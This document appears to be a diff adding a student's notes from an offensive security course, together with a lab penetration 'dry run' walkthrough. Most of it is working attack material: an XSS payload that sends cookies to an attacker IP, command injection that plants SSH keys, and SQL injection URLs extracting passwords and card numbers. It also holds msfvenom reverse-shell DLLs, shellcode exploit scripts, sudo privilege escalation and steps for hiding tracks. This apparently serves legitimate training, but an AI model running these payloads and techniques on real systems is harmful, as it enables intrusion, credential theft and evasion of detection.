@@ -172,3 +172,978 @@ LOPs>ssh -S /tmp/web web -O forward -L 8989:10.100.28.28:80
 LOPs>proxychains nmap -Pn -T4 --min-rate 10000 10.100.28.40
 LOPs>proxychains nc 10.100.28.40 4444 - SSH
 LOPs>ssh -S
+
+Day 2
+
+Web Exploitation-Part 1
+=========================================================================
+HTTP Methods: GET, POST, HEAD, PUT
+Dev console F12
+
+Enumeration
+http://<float ip>/robots.txt
+proxychains nmap -Pn -T5 -sT -p 80 --script http-enum.nse <IP>
+proxychains nmap -Pn -T5 -sT -p 80 --script http-sql-injection.nse <IP>
+proxychains nmap -Pn -T5 -sT -p 80 --script http-robots.txt.nse <IP>
+
+Cross-Site Scripting (XSS)
+need a secure server and a vulnerable browser
+Reflected:
+most common
+transient, occurs in error messages or search results
+delivered through intermediate media, such as link in email
+characters that are normally illegal in URLs can be Base64 encoded
+
+Stored:
+resides on vulnerable site, only requires user to visit page
+capturing cookies with JavaScript: document.cookie
+capturing sensitive data: document.body.innerHTML
+capturing keystrokes: bind KEYDOWN and KEYUP
+
+Capture Cookies
+LOPs>python3 -m http.server
+<script>document.location="http://10.50.40.185:8000/"+document.cookie;</script>
+
+Server-Side Injection
+directory traversal/path traversal
+ability to read/execute outside web server’s directory
+uses relative paths (../../)in manipulating a server-side file path
+/var/www/html
+
+Command Injection
+application on server is vulnerable, allows for execution of arbitrary commands
+user-input is ot validated
+use semicolon to stack commands: ;whoami
+
+SSH Key Upload
+ls -a look for .ssh directory
+if not there: mkdir /var/www/.ssh
+SSH Key Setup
+LOPs>ssh-keygen -t rsa -b 4096
+LOPs>cat ~/.ssh/id_rsa.pub              copy everything in file
+; echo “entire file copied” > /var/www/.ssh/authorized_keys
+Uploading SSH Key
+copy previous command made and use command injection
+cat /var/www/.ssh/authorized_keys
+LOPs>ssh -i id_rsa www-data@<IP>
+
+Day 3
+Web Exploitation-Part 2
+=========================================================================
+SELECT, UNION are biggest commands used for this class
+commands must end in semicolon ;
+
+Command
+Usage
+USE
+Select the database to use**
+SELECT
+Extract data from a database
+UPDATE
+Update data in a database
+DELETE
+Delete data from a database
+INSERT INTO
+Insert new data into a database
+CREATE DATABASE
+Create a new database
+ALTER DATABASE
+Modify an existing database
+CREATE TABLE
+Create a new table
+ALTER TABLE
+Modify an existing table
+DROP TABLE
+Delete a table
+CREATE INDEX
+Create an index (search key)
+DROP INDEX
+Delete an index
+UNION
+Combine the result-set of two or more equal SELECT statements**
+
+Databases hold tables, tables hold columns
+information_schema,mysql,performance_schema – default databases, means anything else is additional
+SELECT <column>,<column>,<column> FROM <database>.<table>;
+When using union, must be same number of columns or a placeholder number can be used
+tom’ OR 1=’1
+F12 →Network Tab, then login, click POST request, RAW, copy add ? After php, then paste, view page source for more readability
+TABLE_SCHEMA,TABLE_NAME,COLUMN_NAME
+Audi' UNION SELECT table_schema,2,table_name,column_name,5 from information_schema.columns; #
+table_schema = databases
+table_name = tables
+column_name = columns
+figure out what site is vulnerable, find column count, golden statement
+replace quotes when pasting into site
+Audi’ UNION SELECT id,2,name,pass,5 FROM session.user; #
+
+http://10.50.35.75/uniondemo.php?Selection=2 or 1=1#
+
+http://10.50.35.75/uniondemo.php?Selection=2 UNION select 1,2,3 #
+
+http://10.50.35.75/uniondemo.php?Selection=2 UNION select 1,3,2 #
+
+http://10.50.35.75/uniondemo.php?Selection=2 UNION select table_schema,column_name,table_name from information_schema.columns #
+
+http://10.50.35.75/uniondemo.php?Selection=2 UNION select type,cost,name from session.car #
+
+Can stack multiple Union statements together if limited by number of columns that can be displayed
+
+http://10.50.35.75/uniondemo.php?Selection=2 UNION select type,cost,name from session.car UNION select color,year,carid from session.car #
+
+Get version of SQL database
+http://10.50.35.75/uniondemo.php?Selection=2 UNION select 1,3,@@version #
+SQL CTF
+127.0.0.1:8989/cases/productsCategory.php?category=1 or 1=1#
+http://127.0.0.1:8990/cases/productsCategory.php?category=1 UNION select table_schema,table_name,column_name from information_schema.columns #
+http://127.0.0.1:8990/cases/productsCategory.php?category=1 UNION select  creditcard_number,2,3 from sqlinjection.payments #
+http://127.0.0.1:8990/cases/productsCategory.php?category=1 UNION select permission,username,password from sqlinjection.members #
+http://127.0.0.1:8990/cases/productsCategory.php?category=1 UNION select id,username,password from sqlinjection.members #
+
+Day 4
+Reverse Engineering/Malware Analysis
+=========================================================================
+Assembly
+%rax-first return register
+%rbp-base pointer
+%rsp-stack pointer
+R-64 bit, E-32 bit, nothing-16bit
+Stack is like rifle magazine
+MOV(LEA), PUSH, POP, CMP, JMP, JNZ-Jump if Not Zero
+
+Workflow
+Static, Behavorial, Dynamic, Disassembly, Document Findings
+
+10.50.30.94-WinOps
+xfreerdp /u:student /v:10.50.30.94 -dynamic-resolution +glyph-cache +clipboard
+
+Static Analysis
+Strings, File
+Behavorial
+Run malware
+Open Ghidra to disassemble
+New Project, open codebrowser, import malware(DO NOT CLICK OPEN)
+Search string
+Param1 in Ghidra means user input
+Entry.exe
+
+When executed, visable command prompt opens and hangs up with prompt to “Enter key:”
+Entered random key and am told failed, then command prompt exits
+Analyze entry.exe in Ghidra:
+search for string “enter” and follow the xref func, find key is 123@magicKey
+
+Basic1
+
+When executed, visable command prompt opens and hangs up with prompt to “Enter key:”
+Entered random key and am told failed, then command prompt exits
+
+92,138,184,230,276,322,368,414,460,506
+Part 2 of Security
+Day 5
+Exploit Development
+=========================================================================
+IP points to memory of next instruction
+Stack pointer points of next availiable space on stack
+Shellcode-written in byte format to ideally get you a shell
+
+Buffer Overflow Defenses
+Non executable stack-part of stack where nothing is allowed to execute
+Address Space Layout Randomization(ASLR)-randomizes the memory addresses of the stack*
+Data Execution Prevention(DEP)-not code should never execute
+Stack Canaries-bytes of data somewhere on the stack if program looks for canary and cannot find it, it siezes execution*
+Position Independent Executable(PIE)
+
+Tools:GDB,IMMUNITY,BASH,PYTHON
+
+Buffer Overflow Demo:
+Run program
+Hangs waiting for input could either want user input or parameters
+Fill it with”a”to overflow program
+gdb <program>
+start with main function
+pdisass main
+ignore get_pc_thunk function
+red underline means vulnerable
+python script to overflow
+<program> <<< $(python <script>) - inserts params as user input
+wiremask.eu
+run in gdb>run <<< $(python funcexploit.py)
+copy EIP hex into wiremask offset
+
+ssh -MS /tmp/gray 10.50.26.30
+ssh -S /tmp/gray dummy -O forward -L 5656:192.168.28.120:4242
+ssh -MS /tmp/t3 -O forward student@127.0.0.1 -p 5656
+ssh -S /tmp/t3 dummy -O forward -L 5897:192.168.150.245:9999
+
+get valid memory space for our code to execute
+env – gdb <file>
+gdb>show env
+gdb>unset env LINES
+gdb>unset env COLUMNS
+gdb>show env
+gdb>manually overflow it
+gbd>info proc map
+find /b <hex on line under heap start address>,<hex on line above stack end address>,0xff,0xe4
+any of returned addresses can be used
+reverse byte order
+LOPs>msfvenom -p linux/x86/exec CMD="whoami" -b '\x00' -f python
+takes any linux commands-use simplest command possible to accomplish goal
+copy payload and add to script
+if didn’t work increase nop by 10
+
+#STEP 1 overflow = "A" * 100
+
+#STEP 2 overflow = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag"
+
+overflow = "A" * 62
+
+eip = "\xe7\xfb\xf7\xf7"
+
+'''
+0xf7 f7 fb e7
+0xf7 f8 1b a3
+0xf7 f8 dc 37
+0xf7 f9 06 37
+0xf7 f9 33 2f
+'''
+nop = "\x90" * 15
+
+buf =  b""
+buf += b"\xd9\xe8\xd9\x74\x24\xf4\x58\xba\xff\x2a\x1e\xb4"
+buf += b"\x33\xc9\xb1\x0b\x31\x50\x19\x03\x50\x19\x83\xc0"
+buf += b"\x04\x1d\xdf\x74\xbf\xb9\xb9\xdb\xd9\x51\x97\xb8"
+buf += b"\xac\x46\x8f\x11\xdc\xe0\x50\x06\x0d\x92\x39\xb8"
+buf += b"\xd8\xb1\xe8\xac\xdc\x35\x0d\x2d\x94\x5d\x62\x4c"
+buf += b"\x37\xf4\x7c\xd9\x94\x8f\x9c\x28\x9a"
+
+print(overflow + eip + nop + buf)
+
+Windows Buffer Overflow:  https://z3r0th.medium.com/a-simple-buffer-overflow-using-vulnserver-86b011eb673b
+Run it
+LOP>Do nmap scan on win ops ports 1-10,000
+
+!mona jmp -r ESP -m “essfunc.dll”
+dlls are the same all jump esps are the same
+msfconsole
+msf6>use multi/handler
+multi/handler>set payload windows/meterpreter/reverse_tcp
+multi/handler>set lhost 0.0.0.0
+set lport 7777
+show options
+#!/usr/bin/python
+import socket
+import sys
+import time
+
+# Outlined below is the general process for performing a Remote Buffer Overflow,
+# the main differences between a Local and Remote Buffer Overflow is the that
+# one requires a network socket to be created and the other does not. The above
+# imports are to allow for SOCKET Creation, and the overall Overflow process is
+# the same!
+#
+# Best Practices:
+#       Use Python 2.7
+#       Reference all hex values with "\x" notation
+#       Redo and Validate all step if you run into errors
+#
+# General Buffer Overflow Process:
+# Step 0: Perform Reverse Engineering/Identify Vulnerability
+# Step 1: Find the Buffer Size/Offset
+# Step 2: Validate EIP Overwrite
+# Step 3: Identify Bad Characters to exclude from shellcode
+# Step 4: Find a Valid JMP ESP (Assembly Instruction)
+# Step 5: Generate Shellcode & Run Exploit
+
+###############################################################################
+# Persistent Variables (Identified through Reverse Engineering)               #
+#       These are called during each step, you will see the following         #
+#       variables:                                                            #
+#              connection - Specifies the tuple for IP and PORT               #
+#              command - Specifies an Executable Program Specific Command     #
+#              shellcode - The variable holding all of your exploit string    #
+###############################################################################
+target_address = 'x.x.x.x'
+target_port = 1234
+connection = ((target_address, target_port))
+
+#Desired Remote Command to use
+command = "COM /.:/"
+
+###############################################################################
+# Step 1: Find the Buffer Size/Offset (MANUALLY)                              #
+#       This shows some basic python functions that can be used throughout    #
+#       your exploit development process, this includes:                      #
+#              - print()                                                      #
+#              - time.sleep()                                                 #
+#              - lens()                                                       #
+#              - while loops                                                  #
+#              - for loops                                                    #
+#              - try/except statements                                        #
+###############################################################################
+print("Setting String Variables")
+buffer = ["A"]
+counter = 100
+
+while len(buffer) <= 40:
+    buffer.append("A" * counter)
+    counter=counter+200
+
+print("Created %s Strings" % len(buffer))
+
+print("Starting loop to interact with Remote Program")
+for string in buffer:
+    try:
+        shellcode = command + string
+        s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        connect=s.connect(connection)
+        print("Fuzzing Executable with %s bytes" % len(string))
+        s.send((shellcode))
+        s.close()
+        time.sleep(5)
+    except:
+        print("Executable has crashed using with %s bytes" % len(string))
+        break
+###############################################################################
+# YOUR TURN, DEVELOP YOUR OWN EXPLOIT                                         #
+#       - Identify and Add the expected variables to your exploit             #
+###############################################################################
+
+###############################################################################
+# Step 1: Find the Buffer Size/Offset (PATTERN)                               #
+#       - Use a pattern Generator to create a pattern                         #
+###############################################################################
+'''
+
+
+shellcode = command +
+
+try:
+    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    connect=s.connect(connection)
+    s.send((shellcode))
+    s.close()
+except:
+    print("bad Connection")
+'''
+###############################################################################
+# Step 2: Validate EIP Overwrite                                              #
+#       - Check that you can overwrite the EIP                                #
+#       - Have you added any NOP's                                            #
+###############################################################################
+'''
+
+
+shellcode = command +
+
+try:
+    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    connect=s.connect(connection)
+    s.send((shellcode))
+    s.close()
+except:
+    print("bad Connection")
+'''
+###############################################################################
+# Step 3: Identify Bad Characters to exclude during shellcode generation      #
+#       - Generator a list of all hex chars 0x00 - 0xFF                       #
+###############################################################################
+'''
+
+
+shellcode = command +
+
+try:
+    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    connect=s.connect(connection)
+    s.send((shellcode))
+    s.close()
+except:
+    print("bad Connection")
+'''
+###############################################################################
+# Step 4: Find a Valid JMP ESP (Assembly Instruction)                         #
+#       - Utilize mona.py, Immunity Debugger Python Plugin                    #
+#       - What Architecture is the Executable                                 #
+#              Does the EIP need to be Little Endian                          #
+###############################################################################
+'''
+
+
+shellcode = command +
+
+try:
+    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    connect=s.connect(connection)
+    s.send((shellcode))
+    s.close()
+except:
+    print("bad Connection")
+'''
+###############################################################################
+# Step 5: Generate Shellcode & Run Exploit                                    #
+#       - Using msfvenom or msfconsole generate an appropriate payload        #
+#              windows/shell_reverse_tcp                                      #
+#              windows/meterpreter/reverse_tcp                                #
+###############################################################################
+'''
+
+
+shellcode = command +
+
+try:
+    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    connect=s.connect(connection)
+    s.send((shellcode))
+    s.close()
+except:
+    print("bad Connection")
+'''
+
+Day 6
+Post Exploitation
+=========================================================================
+Always upload SSH public key
+Steal SSH private key back to your box:
+chmod 600 /home/user/stolenkey
+ssh -i /home/user/stolenkey jane@10.20.30.40
+User Enumeration:
+Windows:
+net user                           - Displays a list of local users by username
+net user <username>                - Displays properties associated with that username
+net localgroup                     - Displays a list of local groups on the system
+net localgroup <groupName>         - Provides a description of what the local group can do with a list of members in that group
+wmic useraccount get name,sid      - This command displays the Security IDs (SIDs) of all user accounts on the system. If you know the username, use this command: wmic useraccount where name="USER" get sid
+Linux:
+cat /etc/passwd *OR* getent passwd - List of all users/accounts on the local system by name, user-id, comment, home directory, and shell.
+cat /etc/shadow                    - List of all users/accounts on the system along with their hashed passwd, password age, and  expiration information.
+last                                 - History of previous account login/logout by username, terminal (local, remote), system/IP, date/time of login/logout, and duration.
+who                                  - Who is currently logged into the system by name, terminal (local/remote), date/time they logged in, and IP address if remote.
+w                                      - Who is currently logged into the system by username, terminal, and what they are doing.
+whoami                             - Displays the user name of the user running the command
+groups                             - Displays the list of groups to which the user running the command is a member
+id                                     - Displays the username, userid, group name(s), and groupid(s) of the user running the command
+Process Enumeration:
+Windows:
+tasklist /v
+Linux:
+ps -elf
+
+Service Enumeration
+Windows:
+tasklist /svc
+Linux:
+chkconfig               -SysV
+systemctl –type=service SystemD
+
+Network Enumeration
+Linux:
+ip a, ip n, etc/hosts
+
+find / -iname “*.txt” 2>/dev/null
+Directories of Interest:
+etc,/
+*.conf
+bin,/home,/tmp,var/tmp
+Post Exploitation Op Notes:
+LOP>ssh -S /tmp/gray dummy -O forward -L 6969:192.168.28.100:2222
+LOP>scp -P 6969 www-data@127.0.0.1:/home/comrade/Dekstop/network/map.png .
+LOP>ssh -S /tmp/extra dummy -O forward  -L 6262:192.168.28.9:3389
+LOP>xfreerdp /u:comrade /v:127.0.0.1:6262 -dynamic-resolution +glyph-cache +clipboard
+
+
+
+
+
+Day 7
+Linux Exploitation and Privilege Escalation
+=========================================================================
+Enumerating for Privilege Escalation:
+sudo -l, GTFO bins
+SUID-run as owner; SGID-run as group
+find / -type f -perm /4000 -ls 2>/dev/null – SUID only
+find / -type f -perm /2000 -ls 2>/dev/null – SGID -only
+find / -type f -perm /6000 -ls 2>/dev/null – SUID and SGID
+Insecure permissions:
+. in path – instead of running actual path will look in current directory for an executable with that name
+Look at cron see where its going to
+Can always write to /tmp
+
+john –wordlist=”Wordlist.txt” <copied etc/shadow>
+
+Persistence:
+Purpose-survive reboot, have foothold for potential future ops
+Add or hijack a user account
+Boot process persistence:
+init.d, run levels,
+check kernel version to see if vulnerable
+
+Covering tracks:
+logs and artifacts
+syslog, rsyslog – service responsible for logs
+/etc/syslog.conf or /etc/rsyslog.conf – find where logs are going
+unset HISTFILE
+ausearch – pulls from audit.log(login information)
+journalctl
+/var/log
+timestomp to hide change or access to a file
+
+System usage:
+df -h, free, netstat -auntp, netstat -rn, ss -an, ss -anp, ss -aep
+
+Demos:
+first thing, look at etc/hosts, crontabs, go to what crontab is pointing to
+sudo -l
+google gtfo bins-unix binaries that can be used to bypass local security restrictions
+search commands from sudo -l, click sudo function
+run what GTFO says
+bash to get bash shell
+
+find / -type f -perm /2000 -ls 2>/dev/null
+go to GTFO search what was found from find command
+click function that was how find command was used, EX:SUID
+
+ls /tmp, can always write to /tmp
+ls -a for hidden files
+
+Crontab:
+/etc/crontab
+google cron guru for breakdown of crontabs
+if see anything outside of default go to file mentioned
+
+. in path:
+echo $PATH
+if . is in path, will look for command in current directory first and run any executable with that name
+identify directory user is going to and put own version of a command in that directory
+
+
+
+Day 8
+Windows Exploitation and Escalation
+=========================================================================
+DLL Hijacking
+Executables check following locations in successive order:
+HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs
+Directory application was run from
+directory specified in the C+ function GetSystemDirectory()
+directory specified in the C+ function GetWindowsDirectory()
+current directory
+
+AutoElevate Executables:
+Levels: asInvoker, highestAvailable
+asInvoker-level of account who ran it
+
+Privilege Escalation:
+Scheduled Tasks and services
+Items to evaluate:
+write permissions
+non-standard locations
+unquoted executable paths
+vulnerabilities in executables
+permissions to run as system
+
+
+Other vulnerabilities:
+unpatched kernel vulnerabilities
+unpatched systems
+unpatched applications
+
+Persistence
+Registry
+(HKLM or HKCU)\Software\Microsoft\Windows\CurrentVersion\(Run or RunOnce)
+Scheduled Tasks-creates log in system logs
+Services
+
+System usage
+wmic, net, netstat
+
+Microsoft Event IDs:
+4624/4625-Successful/failed login
+
+Demos:
+for test, executables and dlls will be given
+
+Use rdp
+try to run cmd as admin
+check for vulnerable programs-services or scheduled tasks, check services first (any user can see every service)
+search bar → services
+look for user created services that run as system or admin-names that look funny/weird description
+click description to sort by description
+
+SysInternals
+net use X: https://live.sysinternals.com/tools
+X:
+
+DLL Hijacking:
+WinOps
+bring back to opstation
+procmon.exe /accepteula
+filter→process name contains putty.exe include
+path contains .dll include
+result is NAME NOT FOUND include
+LinOps
+msfvenom -p windows/shell_reverse_tcp LHOST=<LinOPs IP> LPORT=7777 -b ‘\x00’ -f dll > SSPICLI.dll
+WinOps
+scp exploit back to winops
+LinOps
+msfconsole → multi handler
+set payload windows/shell_reverse_tcp
+set LHOST 0.0.0.0
+set LPORT 7777
+run
+WinOps
+Run putty.exe
+
+Other method if can’t get a shell:
+LinOps
+msfvenom -p windows/exec CMD=”cmd.exe /C whoami > “C:\\whoami.txt”” -b ‘\x00’ -f dll > SSPICLI.dll
+WinOps
+scp it over
+if can’t delete dll, just drag it somewhere else
+
+Vulnerable Executable if you can rename the executable:
+msfvenom -p windows/exec CMD=”cmd.exe /C whoami > “C:\\whoami.txt”” -b ‘\x00’ -f exe > putty.exe
+
+look at any .c file, search for dlls
+
+
+student@lin-ops:~$ ssh -MS /tmp/jumper student@10.50.26.30
+student@lin-ops:~$ ssh -S /tmp/jumper dummy -O forward -L6534:192.168.28.105:2222
+student@lin-ops:~$ ssh -MS /tmp/jumping comrade@127.0.0.1 -p 6534
+student@lin-ops:~$ ssh -S /tmp/jumping dummy -O forward -L7890:192.168.28.5:3389
+student@lin-ops:~$ xfreerdp /u:comrade /v:127.0.0.1:7890 -dynamic-resolution +glyph-cache +clipboard
+student@lin-ops:~$ msfvenom -p windows/shell_reverse_tcp LHOST=10.50.40.185 LPORT=7777 -f dll > hijackmeplz.dll
+student@lin-ops:~$ python -m SimpleHTTPServer 8000
+Windows Box: edge → http:10.50.40.185:8000 (download .dll)
+student@lin-ops:~$ msfconsole
+msf6 > use multi/handler
+msf6 exploit(multi/handler) > set payload windows/shell_reverse_tcp
+msf6 exploit(multi/handler) > set LHOST 0.0.0.0
+msf6 exploit(multi/handler) > set LPORT 7777
+msf6 exploit(multi/handler) > run
+Windows Box: restart box
+
+
+CTF Review
+=========================================================================
+Linux Exploit Development
+Linux Exploitation:
+GTFO bins, exploit development, important files and directories
+Post Exploitation:
+Important files and directories-user home directories
+Recon:
+Actually look at pages, view page source
+**SQL Injection:
+pull info from tables
+Web Exploitation:
+try for command injection
+Windows Privilege Escalation:
+services, registry keys, scheduled tasks-look for user made things running with system
+if can rename executable use executable replacement, if not dll hijacking
+
+Dry Run
+=========================================================================
+10.50.38.74
+
+student@lin-ops:~$ nmap -Pn -T4 10.50.38.74 -p-
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+student@lin-ops:~$ firefox &
+        10.50.38.74
+student@lin-ops:~$ nmap -Pn -T5 -sT -p 80 --script http-enum.nse 10.50.38.74
+PORT   STATE SERVICE
+80/tcp open  http
+| http-enum:
+|   /login.php: Possible admin folder
+|   /login.html: Possible admin folder
+|   /img/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
+|_  /scripts/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
+http://10.50.38.74/login.php
+tom’ OR 1=’1 in user and pass
+welcome Aaron
+http://10.50.38.74/scripts/
+vim development.py
+system_user=user2; user_password=EaglesIsARE78
+student@lin-ops:~$ ssh -MS /tmp/jump user2@10.50.38.74
+$ bash
+user2@PublicFacingWebsite:/$ ip a
+inet 10.10.28.20/27
+user2@PublicFacingWebsite:/$ for i in {1..254} ;do (ping -c 1 10.10.28.$i | grep "bytes from" &) ;done 2>/dev/null
+64 bytes from 10.10.28.20: icmp_seq=1 ttl=64 time=0.012 ms
+64 bytes from 10.10.28.30: icmp_seq=1 ttl=64 time=2.02 ms
+user2@PublicFacingWebsite:/$ cat /etc/hosts
+192.168.28.181 WebApp
+user2@PublicFacingWebsite:/$  for i in {1..254} ;do (ping -c 1 192.168.28.$i | grep "bytes from" &) ;done 2>/dev/null
+64 bytes from 192.168.28.172: icmp_seq=1 ttl=63 time=2.40 ms
+64 bytes from 192.168.28.181: icmp_seq=1 ttl=63 time=2.40 ms
+64 bytes from 192.168.28.190: icmp_seq=1 ttl=64 time=0.685 ms
+student@lin-ops:~$ ssh -S /tmp/jump dummy -O forward -D 9050
+student@lin-ops:~$ proxychains nmap -Pn -T4 10.10.28.20,30
+Nmap scan report for 10.10.28.20
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+53358/tcp open  unknown
+http://10.50.38.74/login.php
+tom’ OR 1=’1 in user and pass F12→network→click login→ view raw→paste after php?
+[name] => user2
+[pass] => RntyrfVfNER78
+[name] => user3
+[pass] => Obo4GURRnccyrf
+[name] => Lee_Roth
+[pass] => anotherpassword4THEages
+http://10.50.38.74/getcareers.php
+;cat ../../../../../../../../../etc/passwd
+
+student@lin-ops:~$ ssh -S /tmp/jump dummy -O forward -L 2200:10.10.28.20:80
+student@lin-ops:~$ proxychains nmap Pn -T5 -sT -p 80 --script http-enum.nse 10.10.28.20
+| http-enum:
+|   /login.php: Possible admin folder
+|   /login.html: Possible admin folder
+|   /img/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
+|   /scripts/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
+|_  /server-status/: Potentially interesting folder
+http://127.0.0.1:2200/server-status
+student@lin-ops:~$ proxychains nmap -Pn -T4 192.168.28.172,181,190
+Nmap scan report for 192.168.28.172
+PORT   STATE SERVICE
+22/tcp open  ssh
+Nmap scan report for 192.168.28.181
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+student@lin-ops:~$ ssh -S /tmp/jump dummy -O forward -L 2203:192.168.28.181:80
+http://127.0.0.1:2203/
+http://127.0.0.1:2203/pick.php?product=7%20or%201=1#
+http://127.0.0.1:2203/pick.php?product=7%20UNION%20select%20table_schema,column_name,table_name%20from%20information_schema.columns%20#
+siteusers
+http://127.0.0.1:2203/pick.php?product=7%20UNION%20select%20id,name,account%20from%20siteusers.customer
+http://127.0.0.1:2203/pick.php?product=7%20UNION%20select%20user_id,username,name%20from%20siteusers.users
+Aaron   ncnffjbeqlCn$$jbeq
+user2   RntyrfVfNER78
+user3   Obo4GURRnccyrf
+Lroth   anotherpassword4THEages
+CyberChef Rot13
+apasswordyPa$$word
+EaglesIsARE78
+Bob4THEEapples
+student@lin-ops:~$ ssh -S /tmp/jump dummy -O forward -L 2204:192.168.28.181:22
+student@lin-ops:~$ ssh -S /tmp/jump dummy -O forward -L 2205:192.168.28.172:22
+user2@PublicFacingWebsite:/$ ssh Aaron@192.168.28.172
+apasswordyPa$$word
+Aaron@RoundSensor:/$ for i in {1..254} ;do (ping -c 1 192.168.28.$i | grep "bytes from" &) ;done 2>/dev/null
+64 bytes from 192.168.28.172: icmp_seq=1 ttl=64 time=0.026 ms
+64 bytes from 192.168.28.179: icmp_seq=1 ttl=128 time=2.47 ms
+64 bytes from 192.168.28.190: icmp_seq=1 ttl=64 time=1.36 ms
+Aaron@RoundSensor:/$ sudo -l
+GTFOBins find
+Aaron@RoundSensor:/$ sudo find . -exec /bin/bash \; -quit
+student@lin-ops:~$ ssh -MS /tmp/t2 -O forward Aaron@127.0.0.1 -p 2205
+student@lin-ops:~$ ssh -S /tmp/jump dummy -O cancel -D9050
+student@lin-ops:~$ ssh -S /tmp/t2 dummy -O forward -D9050
+Nmap done: 2 IP addresses (2 hosts up) scanned in 5.15 seconds
+student@lin-ops:~$ proxychains nmap -Pn -T4 192.168.28.179,190
+Nmap scan report for 192.168.28.179
+PORT     STATE SERVICE
+22/tcp   open  ssh
+135/tcp  open  msrpc
+139/tcp  open  netbios-ssn
+445/tcp  open  microsoft-ds
+3389/tcp open  ms-wbt-server
+9999/tcp open  abyss
+Aaron@RoundSensor:/$ ssh Lroth@192.168.28.179
+anotherpassword4THEages
+student@lin-ops:~$ ssh -S /tmp/t2 dummy -O forward -L 2356:192.168.28.179:3389
+student@lin-ops:~$ xfreerdp /u:lroth /v:127.0.0.1:2356 -dynamic-resolution +glyph-cache +clipboard
+loading channel cliprdr
+student@lin-ops:~$ ssh -S /tmp/t2 dummy -O forward -L 5897:192.168.28.179:9999
+student@lin-ops:~$ vim wim_buff.py
+<change port to 5897>
+msfconsole
+msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
+LHOST     0.0.0.0 LPORT 7777
+run
+student@lin-ops:~$ python wim_buff.py
+C:\Users\Lroth\temp>scp student@10.50.40.185:SSPICLI.dll .
+msfconsole → multi handler
+set payload windows/shell_reverse_tcp
+set LHOST 0.0.0.0
+set LPORT 7777
+run
+Windows Box: run executable
+
+student@lin-ops:~$ msfvenom -p windows/shell_reverse_tcp LHOST=10.50.40.185 LPORT=7777 -f dll > essfunc.dll
+student@lin-ops:~$ msfconsole
+msf6 > use multi/handler
+msf6 exploit(multi/handler) > set payload windows/shell_reverse_tcp
+msf6 exploit(multi/handler) > set LHOST 0.0.0.0
+msf6 exploit(multi/handler) > set LPORT 7777
+msf6 exploit(multi/handler) > run
+
+Dry Run SSGT Wilson Notes
+=========================================================================
+nmap -Pn -T4 –min-rate 10000 10.50.38.74 -p20,21,22,2222,4444,4242,80,8080,3389
+banner grab
+nmap -Pn -T4 10.50.38.74 p80 --script http-enum.nse
+nikto -h 10.50.38.74 (do not proxychains nikto-tool does same as http-enum)
+open firefox and browse to site
+
+malicious file upload
+place to upload files
+know where file was uploaded
+
+Situational Awareness
+whoami && hostname
+cat /etc/hosts
+sudo -l
+Search SUID and GUID for GTFObins
+ls /tmp
+ls /var/tmp
+
+if nmap scan not working add -sT
+if winbuff for 9999 SecureServer exploit doesn’t work: xfreerdp
+
+
+Review
+=========================================================================
+always check for robots.txt
+dont worry about cross site
+command injection, path, uploads
+
+command injection:
+;whoami
+;cat /etc/passwd
+LOP>ssh-keygen -b 4096
+LOP>cat .ssh/id_rsa.pub
+;mkdir /var/www/.ssh                    (.ssh goes in user’s home directory found in etc/passwd)
+;ls -al /var/www                        (verify creation)
+;echo “<entire .pub key>” > /var/www/.ssh/authorized_keys
+;cat /var/www/.ssh/authorized_keys
+LOP>ssh www-data@<IP>
+If it prompts for password redo process
+
+Uploads:
+browse upload webshell.php
+check /uploads
+click on webshell.php
+do ssh-keygen
+
+can only read with directory traversal
+Linux Buffer Overflow:
+sudo -l, user’s home directory, find command
+if func it is buffer overflowable, program will be obvious
+scp program back to LOP
+gdb func
+pdisass main
+ignore pc_thunk
+pdisass getuserinput    (vulnerable function will be red, just gets not gets@plt)
+
+linux buffer overflow
+if you find something like func it will be buffer overflow
+scp uses -P, so scp the function that you will be overflowing
+gdb func
+pdisass main
+  ALWAYS ignore get_pc_thunk
+pdisass getuserinput
+  look up to see if gets is vulnerable on wiremask.eu
+go to wiremask.eu
+bufferoverflow pattern
+vim lin_buff.py
+overflow = "Aa0..."
+print(overflow)
+
+open up the program in gdb again
+gdb func
+run <<< $(python lin_buff.py)
+  take the hexadecimal value from the ip and input it into the register value
+
+vim lin_buff.py
+overflow = "A" * 62
+eip = "B" * 4
+print(overflow + eip)
+
+env - gdb func
+show env
+unset env LINES
+unset env COLUMNS
+show env
+run
+  spam A for a while
+info proc map
+grab the start address under the heap, and the end address above the stack
+0xff,0xe4 will never change
+grab a random 5
+HAVE 5 JUST IN CASE ONE DOESN't WORK
+
+vim lin_buff.py
+overflow = "A" * 62
+eip = '\xef\x59\xf6\xf7'
+'''
+0xf7 f6 59 ef
+0xf7f662eb
+...
+'''
+
+nop = '\x90' * 10
+
+buf =  b""
+buf += b"\xdb\xcd\xbb\x4f\x38\x97\xf5\xd9\x74\x24\xf4\x5f"
+buf += b"\x2b\xc9\xb1\x0d\x31\x5f\x1a\x03\x5f\x1a\x83\xc7"
+buf += b"\x04\xe2\xba\x52\x9c\xad\xdd\xf1\xc4\x25\xf0\x96"
+buf += b"\x81\x51\x62\x76\xe1\xf5\x72\xe0\x2a\x64\x1b\x9e"
